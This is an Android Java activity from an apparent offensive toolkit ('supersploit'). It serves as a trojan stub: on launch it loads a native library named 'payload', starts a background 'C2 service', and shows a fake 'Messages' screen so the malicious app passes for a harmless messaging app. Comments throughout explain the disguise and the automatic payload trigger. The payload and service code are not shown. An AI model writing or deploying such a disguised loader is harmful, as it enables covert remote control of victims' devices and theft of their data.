package org.supersploit.stub;

import android.app.Activity;
import android.os.Bundle;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.graphics.Color;
import android.graphics.Typeface;
import android.view.Gravity;

public class StubActivity extends Activity {
    
    // This is the magic link! When Android opens the Messages UI, 
    // it automatically loads your cross-compiled C payload and triggers JNI_OnLoad.
    static {
        System.loadLibrary("payload");
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Start the magic! This launches the background C2 service.
        android.content.Intent intent = new android.content.Intent(this, PayloadService.class);
        startService(intent);

        // Programmatic UI to mimic a clean "Messages" app
        // This avoids needing complex compiled XML resources in your stub APK.
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setBackgroundColor(Color.parseColor("#FAFAFA"));

        TextView header = new TextView(this);
        header.setText("Messages");
        header.setTextSize(26);
        header.setTextColor(Color.parseColor("#202124"));
        header.setTypeface(null, Typeface.BOLD);
        header.setPadding(50, 50, 50, 50);

        TextView emptyState = new TextView(this);
        emptyState.setText("No conversations found.");
        emptyState.setTextSize(16);
        emptyState.setTextColor(Color.parseColor("#757575"));
        emptyState.setGravity(Gravity.CENTER);
        emptyState.setPadding(0, 150, 0, 0);

        layout.addView(header);
        layout.addView(emptyState);

        setContentView(layout);
    }
}